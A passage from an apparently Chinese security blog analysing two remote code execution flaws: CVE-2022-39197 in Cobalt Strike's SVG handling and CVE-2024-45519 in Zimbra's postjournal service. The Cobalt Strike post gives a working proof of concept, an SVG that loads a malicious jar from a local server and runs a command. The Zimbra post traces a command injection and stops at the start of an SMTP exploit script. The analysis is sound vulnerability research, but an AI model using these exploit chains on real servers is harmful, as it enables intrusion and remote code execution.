src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019103128196.png\" alt=\"image-20221019103128196\"></p>\n<p>svg打xss的方式已经接触过，不如尝试一下引入script标签然后alert。</p>\n<p>1.svg</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;no&quot;?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; </span><br><span class=\"line\">&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot; version&#x3D;&quot;1.1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;circle cx&#x3D;&quot;100&quot; cy&#x3D;&quot;50&quot; r&#x3D;&quot;40&quot; stroke&#x3D;&quot;black&quot; stroke-width&#x3D;&quot;2&quot; fill&#x3D;&quot;red&quot;&#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>\n\n<p>发现报错了: <strong>classnotfound</strong> 这里提取两个信息，一个是 <strong>org.apache.batik</strong>一个是 <strong>org.mozilla.javascript</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019103623108.png\" alt=\"image-20221019103623108\"></p>\n<p>后者通过查找发现是一款基于java编写的js引擎(Rhino)，另外一个js引擎就是v8由c++开发。</p>\n<blockquote>\n<p><strong>Rhino</strong> 是一种使用 Java 语言编写的 JavaScript 的开源实现，原先由Mozilla开发，现在被集成进入JDK 6.0。与其他很多语言一样，Rhino 是一种动态类型的、基于对象的脚本语言，它可以简单地访问各种 Java 类库。</p>\n</blockquote>\n<p>二者一综合，不难推测，由于svg文件中存在script标签，这时调用js引擎处理时，cs的jar中没有对应的库处理js，这里报错还有一个很重要的函数：loadScripts()，下面将进行分析。</p>\n<h1 id=\"独立环境测试\"><a href=\"#独立环境测试\" class=\"headerlink\" title=\"独立环境测试\"></a>独立环境测试</h1><p>为了了解二者的基本操作，本地弄了一个单独的测试环境</p>\n<p>pom.xml添加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;org.mozilla&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;rhino&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;1.7.14&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;org.apache.xmlgraphics&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;batik-all&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;1.14&lt;&#x2F;version&gt;</span><br><span class=\"line\">\t&lt;type&gt;pom&lt;&#x2F;type&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>成功弹窗。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019110555092.png\" alt=\"image-20221019110555092\"></p>\n<p>发现Rhino中可以直接调用java代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019110308207.png\" alt=\"image-20221019110308207\"></p>\n<p>直接尝试在js中调用java代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;no&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; </span><br><span class=\"line\">&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class=\"line\">&lt;svg width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot; version&#x3D;&quot;1.1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;circle cx&#x3D;&quot;100&quot; cy&#x3D;&quot;50&quot; r&#x3D;&quot;40&quot; stroke&#x3D;&quot;black&quot; stroke-width&#x3D;&quot;2&quot; fill&#x3D;&quot;red&quot;&#x2F;&gt;</span><br><span class=\"line\">&lt;script&gt;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);&lt;&#x2F;script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>\n\n<p>成功执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019110732730.png\" alt=\"image-20221019110732730\"></p>\n<h1 id=\"loadScripts\"><a href=\"#loadScripts\" class=\"headerlink\" title=\"loadScripts\"></a>loadScripts</h1><p>很明显这个函数是处理js的，获取所有元素集合，然后调用loadScript()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019172301926.png\" alt=\"image-20221019172301926\"></p>\n<p>loadScript()作用是执行没有执行过的 &lt;script&gt;</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019113204559.png\" alt=\"image-20221019113204559\"></p>\n<p>由于cs中没有js引擎，所以最后无法执行evaluate，那么只能看看在第一个if中存在type字段的情况是否有后续可能利用。分析之后大概作用是满足下面四个条件后远程加载一个jar，利用其loadclass即可执行恶意代码。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019173929053.png\" alt=\"image-20221019173929053\"></p>\n<p>逐步分析构造poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">String href &#x3D; XLinkSupport.getXLinkHref(script);</span><br></pre></td></tr></table></figure>\n\n<p>获取svg中的href内容，这里可构造一个远程恶意的jar</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019175122018.png\" alt=\"image-20221019175122018\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">this.checkCompatibleScriptURL(type, purl);</span><br></pre></td></tr></table></figure>\n\n<p>这里就是检查远程加载svg的地址与远程jar地址是否相同。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019175617657.png\" alt=\"image-20221019175617657\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">URL url &#x3D; cll.findResource(&quot;META-INF&#x2F;MANIFEST.MF&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这里要求远程jar有该文件，接着从 MANIFEST.MF 文件中找 <strong>Script-Handler</strong> 的值，然后加载该值所代表的类。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest man &#x3D; new Manifest(url.openStream());</span><br><span class=\"line\">this.executedScripts.put(script, (Object)null);</span><br><span class=\"line\">mediaType &#x3D; man.getMainAttributes().getValue(&quot;Script-Handler&quot;);</span><br><span class=\"line\">if (mediaType !&#x3D; null) &#123;</span><br><span class=\"line\">\tScriptHandler h &#x3D; (ScriptHandler)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();</span><br><span class=\"line\">\th.run(this.document, this.getWindow());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样构造即可</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019180049077.png\" alt=\"image-20221019180049077\"></p>\n<p>补充：MANIFEST.MF添加SVG-Handler-Class同样可以</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019181841415.png\" alt=\"image-20221019181841415\"></p>\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><p>evil.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打包成jar</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">jar -cvf evil.jar evil.class</span><br></pre></td></tr></table></figure>\n\n<p>然后修改META-INF/MANIFEST.MF</p>\n<p>准备svg文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;no&quot;?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; </span><br><span class=\"line\">&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot; version&#x3D;&quot;1.1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;circle cx&#x3D;&quot;100&quot; cy&#x3D;&quot;50&quot; r&#x3D;&quot;40&quot; stroke&#x3D;&quot;black&quot; stroke-width&#x3D;&quot;2&quot; fill&#x3D;&quot;red&quot;&#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script type&#x3D;&quot;application&#x2F;java-archive&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; xlink:href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;evil.jar&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>\n\n<p>将svg与jar放到远程服务器中。</p>\n<p>demo.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span>   </span>&#123;</span><br><span class=\"line\">        SwingUtilities.invokeLater(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                createAndShowGUI();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">createAndShowGUI</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        JFrame frame = <span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        frame.setPreferredSize(<span class=\"keyword\">new</span> Dimension(<span class=\"number\">300</span>, <span class=\"number\">300</span>));</span><br><span class=\"line\">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class=\"line\">        frame.setLocationRelativeTo(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        JLabel jLabel = <span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;&lt;html&gt;&lt;object classid=\\&quot;org.apache.batik.swing.JSVGCanvas\\&quot;&gt;&lt;param name=\\&quot;URI\\&quot; value=\\&quot;http://127.0.0.1:8000/1.svg\\&quot;&gt;&lt;/object&gt;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        frame.add(jLabel);</span><br><span class=\"line\"></span><br><span class=\"line\">        frame.pack();</span><br><span class=\"line\">        frame.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-39197/image-20221019180513452.png\" alt=\"image-20221019180513452\"></p>\n<h1 id=\"cs反制\"><a href=\"#cs反制\" class=\"headerlink\" title=\"cs反制\"></a>cs反制</h1><p>文章提到的两种手法</p>\n<ul>\n<li>首页frame绕过长度限制</li>\n<li>通过frada脚本来hook win api修改tasklist返回的进程名，将进程名改写成攻击payload</li>\n</ul>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xmlgraphics.apache.org/batik/\">Apache Batik SVG Toolkit</a></p>\n<p><a href=\"https://xmlgraphics.apache.org/batik/javadoc/\">https://xmlgraphics.apache.org/batik/javadoc/</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ\">最新CS RCE曲折的复现路 (qq.com)</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/89wXyPaSn3TYn4pmVdr-Mw\">最新CS RCE（CVE-2022-39197）复现心得分享</a></p>\n","categories":["JavaCVES"]},{"title":"Zimbra-RCE-分析(CVE-2024-45519)","url":"/2024/10/06/CVE-2024-45519/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/Blog---Zimbra.png\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h1><p>在远程 Zimbra 服务器开启了 postjournal 服务时，未授权的远程攻击者可构造特殊的请求包发送至远程的Zimbra系统，在目标系统中执行命令，从而获取目标系统的服务器权限。</p>\n<h1 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h1><p>仅影响 Zimbra Network Edition 付费版本</p>\n<ul>\n<li><p>Zimbra Collaboration &lt; 8.8.15 Patch 46</p>\n</li>\n<li><p>Zimbra Collaboration &lt; 9.0.0 Patch 41</p>\n</li>\n<li><p>Zimbra Collaboration &lt; 10.0.9</p>\n</li>\n<li><p>Zimbra Collaboration &lt; 10.1.1</p>\n</li>\n</ul>\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><h2 id=\"邮件相关的协议\"><a href=\"#邮件相关的协议\" class=\"headerlink\" title=\"邮件相关的协议\"></a>邮件相关的协议</h2><ul>\n<li>smtp</li>\n<li>pop3</li>\n<li>imap</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241005191535999.png\" alt=\"image-20241005191535999\"></p>\n<h2 id=\"邮件基础原理\"><a href=\"#邮件基础原理\" class=\"headerlink\" title=\"邮件基础原理\"></a>邮件基础原理</h2><ul>\n<li><p>MUA（Mail User Agent）接收邮件所使用的邮件客户端，使用IMAP或POP3协议与服务器通信；</p>\n</li>\n<li><p>MTA（Mail Transfer Agent） 通过SMTP协议发送、转发邮件；</p>\n</li>\n<li><p>MDA（Mail Deliver Agent）将MTA接收到的邮件保存到磁盘或指定地方，进行垃圾邮件及病毒扫描；</p>\n</li>\n<li><p>MRA（Mail Receive Agent）负责实现IMAP与POP3协议，与MUA进行交互；</p>\n</li>\n<li><p>SMTP（Simple Mail Transfer Protocol）传输发送邮件所使用的标准协议；</p>\n</li>\n<li><p>IMAP（Internet Message Access Protocol）接收邮件使用的标准协议之一；</p>\n</li>\n<li><p>POP3（Post Office Protocol 3） 接收邮件使用的标准协议之一。</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>概念</th>\n<th>常用软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MUA</td>\n<td>outlook、thunderbird、Mac Mail、mutt</td>\n</tr>\n<tr>\n<td>MTA</td>\n<td>sendmail、postfix</td>\n</tr>\n<tr>\n<td>MDA</td>\n<td>procmail、dropmail</td>\n</tr>\n<tr>\n<td>MRA</td>\n<td>dovecot</td>\n</tr>\n</tbody></table>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241005192254815.png\" alt=\"image-20241005192254815\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241005192630665.png\" alt=\"image-20241005192630665\"></p>\n<h2 id=\"邮件过程图示\"><a href=\"#邮件过程图示\" class=\"headerlink\" title=\"邮件过程图示\"></a>邮件过程图示</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/082159327033346.png\" alt=\"img\"></p>\n<h2 id=\"zimbra架构\"><a href=\"#zimbra架构\" class=\"headerlink\" title=\"zimbra架构\"></a>zimbra架构</h2><p>Zimbra Collaboration Server（Zimbra协作服务器）简称：ZCS，zimbra目前分为</p>\n<ul>\n<li>Zimbra Open Source (ZOS)：开源，免费</li>\n<li>Zimbra Network Edition (ZNE)：商业，付费</li>\n</ul>\n<p>在安装时会安装以下包：</p>\n<ul>\n<li>zimbra-core：<strong>核心组件</strong>，libraries, utilities, monitoring tools, and basic configuration files</li>\n<li>zimbra-ldap：用户验证组件</li>\n<li>zimbra-logger：用于系统日志聚合和报告的工具</li>\n<li>zimbra-mta：负责邮件的传输和递送，使用 Postfix。它处理邮件的收发、转发以及垃圾邮件和病毒扫描等功能</li>\n<li>zimbra-dnscache：用于提供本地 DNS 缓存服务</li>\n<li>zimbra-snmp：对 Zimbra 邮件服务器进行监控和管理</li>\n<li>zimbra-store：<strong>核心组件</strong>，主要负责处理与邮箱相关的所有存储、访问和管理、WEB应用功能</li>\n<li>zimbra-apache：随zimbra-spell自动安装</li>\n<li>zimbra-spell：拼写检查</li>\n<li>zimbra-memcached：一个加快数据访问速度的缓存服务模块，帮助管理会话信息、身份验证状态以及其他需要快速访问的数据</li>\n<li>zimbra-proxy：一种高性能的反向代理服务，用于将IMAP[S]/POP[S]/HTTP[S]客户端请求传递给其他内部ZCS服务</li>\n<li>zimbra-drive：WEB客户端管理文件</li>\n<li>zimbra-patch：修漏洞用</li>\n<li>zimbra-mta-patch：修漏洞用</li>\n<li>zimbra-proxy-patch：修漏洞用</li>\n<li>zimbra-chat：在 Web 客户端中进行实时消息交流</li>\n</ul>\n<p>以下是不同端口的功能：<a href=\"https://wiki.zimbra.com/wiki/Ports\">https://wiki.zimbra.com/wiki/Ports</a></p>\n<ul>\n<li>25：smtp，邮件服务</li>\n<li>80：web mail client</li>\n<li>465：smtps，邮件服务 with TLS</li>\n<li>587：Mail submission over TLS</li>\n<li>110：POP3</li>\n<li>143：IMAP</li>\n<li>993：IMAP over TLS</li>\n<li>995：POP3 over TLS</li>\n<li>443：HTTP over TLS</li>\n<li>8080：Backend HTTP</li>\n<li>8443：Backend HTTPS</li>\n<li>7071：admin console HTTP over TLS</li>\n<li>9071：HTTP over TLS</li>\n<li>10027：postjournal</li>\n</ul>\n<h2 id=\"postjournal\"><a href=\"#postjournal\" class=\"headerlink\" title=\"postjournal\"></a>postjournal</h2><p><a href=\"https://wiki.zimbra.com/wiki/New_Features_ZCS_8.5\">https://wiki.zimbra.com/wiki/New_Features_ZCS_8.5</a></p>\n<p>该服务可以为所有进入或离开 MTA 并传递到特定地址的消息创建日志，即该服务创建邮件副本，作为日志进行留存。</p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>单服务器搭建参考：<a href=\"https://zimbra.github.io/installguides/latest/single.html\">https://zimbra.github.io/installguides/latest/single.html</a></p>\n<p>因硬件条件不支持，没有成功安装Network版本，故搭建本地测试环境失败。</p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><p>通过下载历史版本安装包：<a href=\"https://files.zimbra.com/downloads/8.8.15_GA/zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz\">https://files.zimbra.com/downloads/8.8.15_GA/zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz</a> ，找到 postjournal 二进制文件，路径：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220\\packages\\zimbra-core_8.8.15.GA.4177.UBUNTU20.64_amd64.deb\\data.tar\\.\\opt\\zimbra\\libexec\\postjournal</span><br></pre></td></tr></table></figure>\n\n<p>main通过 get_pj_config 和 get_pf_config 函数配置一些变量</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006143609380.png\" alt=\"image-20241006143609380\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006143736540.png\" alt=\"image-20241006143736540\"></p>\n<p>main最后通过 <strong>msg_receiver</strong> 用于接收处理SMTP消息，间接调用 <strong>msg_handler() 处理 MSG 消息对象</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006143901566.png\" alt=\"image-20241006143901566\"></p>\n<p>在 <strong>msg_receiver</strong> 中，首先初始化MSG对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">MSG *__cdecl msg_init()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  MSG *msg; &#x2F;&#x2F; [rsp+8h] [rbp-8h]</span><br><span class=\"line\"></span><br><span class=\"line\">  msg &#x3D; (MSG *)malloc(0x58uLL);</span><br><span class=\"line\">  if ( !msg )</span><br><span class=\"line\">    return 0LL;</span><br><span class=\"line\">  msg-&gt;current_state &#x3D; 0;</span><br><span class=\"line\">  msg-&gt;current_time &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;helo_hostname &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;origin_address &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;received_hdr &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;rcpt_addresses &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;xforward_info &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;subject &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;msg_id &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;message &#x3D; 0LL;</span><br><span class=\"line\">  msg-&gt;msg_file &#x3D; 0LL;</span><br><span class=\"line\">  return msg;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>循环解析出输入流中SMTP命令</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006160034993.png\" alt=\"image-20241006160034993\"></p>\n<p>匹配RCPT时，调用 <strong>rcpt_to_handler</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006173102048.png\" alt=\"image-20241006173102048\"></p>\n<p><strong>rcpt_to_handler</strong> 解析出 <code>RCPT TO:&lt;...&gt;</code> 中的email地址存储在 <strong>msg-&gt;rcpt_addresses</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006173252466.png\" alt=\"image-20241006173252466\"></p>\n<p>最后调用 <strong>msg_handler</strong> 进一步处理SMTP消息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006165433602.png\" alt=\"image-20241006165433602\"></p>\n<p>跟进 <strong>msg_handler</strong> ，通过 <strong>find_addresses</strong> 获取一个email地址列表，随后将 <strong>msg-&gt;rcpt_addresses</strong> 合并到该列表后调用 <strong>expand_addrs</strong> 尝试获取列表中的email地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006165352384.png\" alt=\"image-20241006165352384\"></p>\n<p><strong>expand_addrs</strong> 通过三种邮件映射类型去获取真正的邮件地址，调用到了 <strong>address_lookup</strong></p>\n<ul>\n<li>virtual_alias_maps</li>\n<li>canonical_maps</li>\n<li>local_alias_maps</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006165635610.png\" alt=\"image-20241006165635610\"></p>\n<p><strong>address_lookup</strong> 就是上述三种映射的封装，并调用 <strong>map_address</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006170435750.png\" alt=\"image-20241006170435750\"></p>\n<p><strong>map_address</strong> 调用 <strong>read_addr_maps</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006170623079.png\" alt=\"image-20241006170623079\"></p>\n<p><strong>read_addr_maps</strong> 调用 <strong>read_maps</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006170658536.png\" alt=\"image-20241006170658536\"></p>\n<p>最终在 <strong>read_maps</strong> 通过可控的 email addr 进行格式化字符串完成popen命令注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006171425215.png\" alt=\"image-20241006171425215\"></p>\n<p>完整调用链</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">main</span><br><span class=\"line\">└── msg_handler(MSG *msg)</span><br><span class=\"line\">    └── expand_addrs</span><br><span class=\"line\">        └── address_lookup</span><br><span class=\"line\">            └── map_address</span><br><span class=\"line\">                └── read_addr_maps</span><br><span class=\"line\">                    └── read_maps</span><br><span class=\"line\">                        └── popen(通过rcpt_addresses)</span><br></pre></td></tr></table></figure>\n\n<p>下载漏洞修复的patch文件：<a href=\"https://repo.zimbra.com/apt/8815-ne/pool/zimbra/z/zimbra-patch/zimbra-patch_8.8.15.1723777774.p46-2.u16_amd64.deb\">https://repo.zimbra.com/apt/8815-ne/pool/zimbra/z/zimbra-patch/zimbra-patch_8.8.15.1723777774.p46-2.u16_amd64.deb</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">zimbra-patch_8.8.15.1723777774.p46-2.u16_amd64.deb\\data.tar\\.\\opt\\zimbra\\lib\\patches\\</span><br></pre></td></tr></table></figure>\n\n<p>在 read_maps 新增函数 <strong>run_command</strong> 和 <strong>is_safe_input</strong> </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006180549199.png\" alt=\"image-20241006180549199\"></p>\n<p>is_safe_input过滤一些注入字符</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006180635140.png\" alt=\"image-20241006180635140\"></p>\n<p>run_command通过execvp以数组形式更安全的执行命令</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006180653204.png\" alt=\"image-20241006180653204\"></p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>根据文档，10027端口为postjournal端口，构造SMTP结构消息体发过去即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">def smtp_payload_check_vulnerability(host, port, oast):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        with socket.create_connection((host, port), timeout&#x3D;10) as conn:</span><br><span class=\"line\">            conn.send(b&#39;EHLO localhost\\r\\n&#39;)</span><br><span class=\"line\">            conn.recv(1024)</span><br><span class=\"line\"></span><br><span class=\"line\">            conn.send(b&#39;MAIL 